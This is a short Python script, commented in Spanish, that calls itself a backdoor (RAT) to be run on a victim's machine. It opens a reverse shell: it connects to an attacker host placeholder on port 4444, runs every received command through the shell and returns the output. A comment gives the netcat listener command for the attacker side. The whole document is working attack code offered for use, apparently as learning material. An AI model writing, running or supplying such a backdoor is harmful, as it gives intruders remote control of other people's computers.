#!/usr/bin/env python3

"""
    Crea un apuerta trasera para controlar un equipo remoto RAT
    Este script se tiene que ejecutar en la máquina víctima
"""

# Preparamos un puerto local para recibir peticiones
# nc -vv -l -p 4444

import socket
import subprocess


def do(command):
    return subprocess.check_output(command, shell=True)


con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 4444
con.connect(("own_ip", port))

# Mandar un paquete
con.send("\n\t[+] Conection stablished\n")

while True:
    # Recibir un paquete (de tamaño máximo 1024)
    recieved_data = con.recv(1024)
    done = do(recieved_data)
    con.send(done)

con.close()
